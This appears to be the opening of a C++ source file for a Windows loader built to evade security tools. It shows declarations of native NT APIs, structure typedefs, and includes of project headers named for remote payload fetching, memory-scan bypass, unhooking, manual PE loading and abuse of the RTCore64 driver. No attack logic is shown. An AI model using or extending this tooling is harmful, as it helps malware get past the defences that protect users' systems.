#define _CRT_RAND_S
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <limits>
#include <stdlib.h>
#include <Sddl.h>

#include "GetRemoteData.h"
#include "BypassMemScan.h"
#include "Encrypting.h"
#include "Unhooking.h"
#include "PELoading.h"
#include "Block.h"
#include "RTCore64Abuse.h"



#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "winhttp")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS






#pragma comment(lib, "ntdll")




EXTERN_C NTSTATUS NtOpenSection(
    OUT PHANDLE             SectionHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
);

using MyNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );



typedef NTSTATUS(NTAPI* NtQueryInformationThreadPtr)(
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    OUT PVOID ThreadInformation,
    IN ULONG ThreadInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );


typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS                ExitStatus;
    PVOID                   TebBaseAddress;
    CLIENT_ID               ClientId;
    KAFFINITY               AffinityMask;
    KPRIORITY               Priority;
    KPRIORITY               BasePriority;
} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;





typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;



